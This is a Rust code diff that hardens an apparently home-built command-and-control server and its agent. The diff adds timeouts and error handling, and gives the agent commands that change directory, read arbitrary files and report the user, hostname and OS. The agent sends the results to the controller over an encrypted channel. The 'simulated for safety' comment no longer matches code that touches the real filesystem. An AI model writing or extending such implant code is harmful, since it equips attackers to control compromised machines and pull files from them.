@@ -203,6 +203,10 @@ fn handle_agent(
 ) -> io::Result<()> {
     let peer_addr = stream.peer_addr()?.to_string();
 
+    // Set timeout for all socket operations
+    stream.set_read_timeout(Some(Duration::from_secs(10)))?;
+    stream.set_write_timeout(Some(Duration::from_secs(5)))?;
+
     // Generate encryption key for this session
     let encryption_key = Crypto::generate_key();
     let crypto = Crypto::new(&encryption_key);
@@ -212,18 +216,47 @@ fn handle_agent(
     stream.write_all(key_b64.as_bytes())?;
     stream.write_all(b"\n")?;
 
-    // Read registration message
+    // Read registration message with timeout
     let mut buffer = vec![0u8; 4096];
-    let n = stream.read(&mut buffer)?;
+    let n = match stream.read(&mut buffer) {
+        Ok(n) if n == 0 => {
+            eprintln!("[-] Agent disconnected before registration");
+            return Ok(());
+        }
+        Ok(n) => n,
+        Err(e) => {
+            eprintln!("[-] Failed to read registration: {}", e);
+            return Err(e);
+        }
+    };
 
-    let decrypted = crypto
-        .decrypt(&buffer[..n])
-        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
+    // Validate minimum message size
+    if n < 12 {
+        eprintln!("[-] Registration message too small ({} bytes)", n);
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            "Message too small",
+        ));
+    }
 
-    let msg: Message = serde_json::from_slice(&decrypted)
-        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
+    let decrypted = match crypto.decrypt(&buffer[..n]) {
+        Ok(data) => data,
+        Err(e) => {
+            eprintln!("[-] Decryption failed: {}", e);
+            return Err(io::Error::new(io::ErrorKind::InvalidData, e));
+        }
+    };
+
+    let msg: Message = match serde_json::from_slice(&decrypted) {
+        Ok(m) => m,
+        Err(e) => {
+            eprintln!("[-] JSON parse failed: {}", e);
+            return Err(io::Error::new(io::ErrorKind::InvalidData, e));
+        }
+    };
 
     if !matches!(msg.msg_type, MessageType::Register) {
+        eprintln!("[-] Expected registration, got {:?}", msg.msg_type);
         return Err(io::Error::new(
             io::ErrorKind::InvalidData,
             "Expected registration",
@@ -269,7 +302,9 @@ fn handle_agent(
         tasks_map.insert(agent.id.clone(), Vec::new());
     }
 
-    // Main command loop
+    // Main command loop with relaxed timeout
+    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
+
     loop {
         // Check for pending tasks
         let pending_task = {
@@ -315,53 +350,68 @@ fn handle_agent(
                 break;
             }
             Ok(n) => {
-                let decrypted = crypto
-                    .decrypt(&response_buf[..n])
-                    .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
+                // Skip if message is too small
+                if n < 12 {
+                    thread::sleep(Duration::from_millis(100));
+                    continue;
+                }
 
-                let response: Message = serde_json::from_slice(&decrypted)
-                    .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
+                match crypto.decrypt(&response_buf[..n]) {
+                    Ok(decrypted) => {
+                        match serde_json::from_slice::<Message>(&decrypted) {
+                            Ok(response) => {
+                                match response.msg_type {
+                                    MessageType::Response => {
+                                        println!(
+                                            "[<] Response from {}: {}",
+                                            agent.id,
+                                            if response.payload.len() > 100 {
+                                                format!("{}...", &response.payload[..100])
+                                            } else {
+                                                response.payload.clone()
+                                            }
+                                        );
 
-                match response.msg_type {
-                    MessageType::Response => {
-                        println!(
-                            "[<] Response from {}: {}",
-                            agent.id,
-                            if response.payload.len() > 100 {
-                                format!("{}...", &response.payload[..100])
-                            } else {
-                                response.payload.clone()
+                                        // Update task status
+                                        let mut tasks_map = tasks.lock().unwrap();
+                                        if let Some(agent_tasks) = tasks_map.get_mut(&agent.id) {
+                                            if let Some(task) = agent_tasks
+                                                .iter_mut()
+                                                .find(|t| t.status == TaskStatus::Running)
+                                            {
+                                                task.status = TaskStatus::Completed;
+                                                task.result = Some(response.payload);
+                                            }
+                                        }
+                                    }
+                                    MessageType::Heartbeat => {
+                                        // Update last seen
+                                        let mut agents_map = agents.lock().unwrap();
+                                        if let Some(a) = agents_map.get_mut(&agent.id) {
+                                            a.last_seen = get_timestamp();
+                                        }
+                                    }
+                                    MessageType::Disconnect => {
+                                        println!("[*] Agent {} requesting disconnect", agent.id);
+                                        break;
+                                    }
+                                    _ => {}
+                                }
                             }
-                        );
-
-                        // Update task status
-                        let mut tasks_map = tasks.lock().unwrap();
-                        if let Some(agent_tasks) = tasks_map.get_mut(&agent.id) {
-                            if let Some(task) = agent_tasks
-                                .iter_mut()
-                                .find(|t| t.status == TaskStatus::Running)
-                            {
-                                task.status = TaskStatus::Completed;
-                                task.result = Some(response.payload);
+                            Err(e) => {
+                                eprintln!("[!] JSON parse error from {}: {}", agent.id, e);
                             }
                         }
                     }
-                    MessageType::Heartbeat => {
-                        // Update last seen
-                        let mut agents_map = agents.lock().unwrap();
-                        if let Some(a) = agents_map.get_mut(&agent.id) {
-                            a.last_seen = get_timestamp();
-                        }
+                    Err(e) => {
+                        eprintln!("[!] Decrypt error from {}: {}", agent.id, e);
                     }
-                    MessageType::Disconnect => {
-                        println!("[*] Agent {} requesting disconnect", agent.id);
-                        break;
-                    }
-                    _ => {}
                 }
             }
-            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
-                // Timeout - continue loop
+            Err(ref e)
+                if e.kind() == io::ErrorKind::WouldBlock || e.kind() == io::ErrorKind::TimedOut =>
+            {
+                // Timeout - continue loop, agent may send heartbeat later
                 thread::sleep(Duration::from_millis(100));
             }
             Err(e) => {
@@ -405,23 +455,28 @@ impl C2Agent {
         println!("[*] Connecting to C2 server at {}...", self.server_addr);
 
         let mut stream = TcpStream::connect(&self.server_addr)?;
+        stream.set_read_timeout(Some(Duration::from_secs(5)))?;
         println!("[+] Connected!");
 
-        // Receive encryption key
-        let mut key_buffer = String::new();
-        let mut reader = BufReader::new(stream.try_clone()?);
+        // Receive encryption key with timeout
+        let mut key_buffer = vec![0u8; 256];
+        let n = stream.read(&mut key_buffer)?;
 
-        // Read until newline
-        for byte in reader.by_ref().bytes() {
-            let b = byte?;
-            if b == b'\n' {
-                break;
-            }
-            key_buffer.push(b as char);
+        // Trim to actual bytes read and strip newline
+        let key_str = String::from_utf8(key_buffer[..n].to_vec())
+            .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?
+            .trim()
+            .to_string();
+
+        if key_str.is_empty() {
+            return Err(io::Error::new(
+                io::ErrorKind::InvalidData,
+                "Empty encryption key received",
+            ));
         }
 
         let key = general_purpose::STANDARD
-            .decode(&key_buffer)
+            .decode(&key_str)
             .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
 
         self.crypto = Some(Crypto::new(&key));
@@ -444,21 +499,35 @@ impl C2Agent {
                 }
                 Ok(n) => {
                     if let Some(ref crypto) = self.crypto {
-                        let decrypted = crypto
-                            .decrypt(&buffer[..n])
-                            .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
+                        // Skip if message is too small to be valid
+                        if n < 12 {
+                            thread::sleep(Duration::from_millis(100));
+                            continue;
+                        }
 
-                        let msg: Message = serde_json::from_slice(&decrypted)
-                            .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
-
-                        if matches!(msg.msg_type, MessageType::Command) {
-                            println!("[>] Received command: {}", msg.payload);
-                            let result = self.execute_command(&msg.payload);
-                            self.send_response(&mut stream, result)?;
+                        match crypto.decrypt(&buffer[..n]) {
+                            Ok(decrypted) => match serde_json::from_slice::<Message>(&decrypted) {
+                                Ok(msg) => {
+                                    if matches!(msg.msg_type, MessageType::Command) {
+                                        println!("[>] Received command: {}", msg.payload);
+                                        let result = self.execute_command(&msg.payload);
+                                        let _ = self.send_response(&mut stream, result);
+                                    }
+                                }
+                                Err(e) => {
+                                    eprintln!("[!] JSON parse error: {}", e);
+                                }
+                            },
+                            Err(e) => {
+                                eprintln!("[!] Decrypt error: {}", e);
+                            }
                         }
                     }
                 }
-                Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
+                Err(ref e)
+                    if e.kind() == io::ErrorKind::WouldBlock
+                        || e.kind() == io::ErrorKind::TimedOut =>
+                {
                     // Send heartbeat every 10 iterations
                     heartbeat_counter += 1;
                     if heartbeat_counter >= 10 {
@@ -496,18 +565,22 @@ impl C2Agent {
 
     /// Execute a command (simulated for safety)
     fn execute_command(&self, command: &str) -> String {
-        match command {
-            "sysinfo" => format!(
+        let parts: Vec<&str> = command.split_whitespace().collect();
+        
+        match parts.get(0).copied() {
+            Some("sysinfo") => format!(
                 "OS: {}\nHostname: {}\nUser: {}\nAgent ID: {}",
                 get_os(),
                 get_hostname(),
                 get_username(),
                 self.id
             ),
-            "pwd" => std::env::current_dir()
+            Some("pwd") => std::env::current_dir()
                 .map(|p| p.display().to_string())
                 .unwrap_or_else(|_| "unknown".to_string()),
-            "ls" => {
+            Some("whoami") => get_username(),
+            Some("hostname") => get_hostname(),
+            Some("ls") | Some("dir") => {
                 // List current directory (safe operation)
                 match fs::read_dir(".") {
                     Ok(entries) => entries
@@ -518,15 +591,58 @@ impl C2Agent {
                     Err(e) => format!("Error: {}", e),
                 }
             }
-            cmd if cmd.starts_with("echo ") => cmd[5..].to_string(),
-            "help" => "Available commands:\n\
+            Some("cd") => {
+                if parts.len() > 1 {
+                    match std::env::set_current_dir(parts[1]) {
+                        Ok(_) => format!("Changed to: {}", parts[1]),
+                        Err(e) => format!("Error changing directory: {}", e),
+                    }
+                } else {
+                    "Usage: cd <path>".to_string()
+                }
+            }
+            Some("echo") => {
+                if command.len() > 5 {
+                    command[5..].to_string()
+                } else {
+                    String::new()
+                }
+            }
+            Some("cat") => {
+                if parts.len() > 1 {
+                    match fs::read_to_string(parts[1]) {
+                        Ok(content) => content,
+                        Err(e) => format!("Error reading file: {}", e),
+                    }
+                } else {
+                    "Usage: cat <file>".to_string()
+                }
+            }
+            Some("sleep") => {
+                if parts.len() > 1 {
+                    if let Ok(seconds) = parts[1].parse::<u64>() {
+                        thread::sleep(Duration::from_secs(seconds));
+                        format!("Slept for {} seconds", seconds)
+                    } else {
+                        "Invalid sleep duration".to_string()
+                    }
+                } else {
+                    "Usage: sleep <seconds>".to_string()
+                }
+            }
+            Some("help") => "Available commands:\n\
                  - sysinfo: Display system information\n\
                  - pwd: Print working directory\n\
-                 - ls: List directory contents\n\
+                 - whoami: Show current user\n\
+                 - hostname: Show hostname\n\
+                 - ls/dir: List directory contents\n\
+                 - cd <path>: Change directory\n\
                  - echo <text>: Echo text\n\
+                 - cat <file>: Read file contents\n\
+                 - sleep <seconds>: Sleep for N seconds\n\
                  - help: Show this help"
                 .to_string(),
-            _ => format!("Command '{}' executed (simulated)", command),
+            _ => format!("Unknown command: '{}'", command),
         }
     }
 
